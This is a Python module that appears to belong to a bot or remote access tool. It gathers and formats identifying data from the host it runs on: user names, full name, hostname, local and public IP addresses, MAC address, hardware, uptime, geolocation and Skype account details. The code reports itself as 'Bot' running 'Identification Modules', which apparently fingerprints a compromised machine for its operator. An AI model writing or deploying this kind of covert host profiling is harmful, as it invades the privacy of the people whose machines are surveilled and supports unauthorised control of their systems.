from shell_tools import run_cmd
from system_info import (
    get_platform,
    get_current_user,
    get_main_user,
    get_full_username,
    get_local_ips,
    get_public_ip,
    get_hostname,
    get_mac_addr,
    get_hardware,
    get_power,
    get_uptime,
    get_location,
)
from skype import get_skype_info

from settings import VERSION

def get_system_short():
    platform = get_platform()
    main_user = get_main_user()
    main_user_full = get_full_username(main_user)
    user_str = '%s@%s' % (main_user[:14], get_hostname()[:13])
    local_ips = ','.join(get_local_ips())
    public_ip = get_public_ip()
    mac_addr = get_mac_addr()

    return "[v%s/x%s] %s %s l: %s p: %s MAC: %s" % (
        VERSION,
        platform,
        main_user_full.ljust(20),
        user_str.ljust(30),
        local_ips.ljust(16),
        public_ip.ljust(16),
        mac_addr,
    )

def get_system_full():
    main_user = get_main_user()
    main_user_full = get_full_username(main_user)

    yield '[+] Running v%s Identification Modules...' % VERSION
    yield '[>]      System:    %s' % get_platform()
    yield '[>]      Bot:       %s' % get_current_user()
    yield '[>]      User:      %s (%s)' % (main_user_full, main_user)
    yield '[>]      Host:      %s' % get_hostname()
    yield '[>]      Local:     %s' % ','.join(get_local_ips())
    yield '[>]      Public:    %s' % get_public_ip()
    yield '[>]      MAC:       %s' % get_mac_addr()
    yield '[>]      Power:     %s' % get_power()
    yield '[>]      Uptime:    %s' % get_uptime()
    yield '[>]      Location:  %s' % get_location()
    yield from get_skype_info(main_user)
    yield from get_hardware()
    yield '[√] Done.'
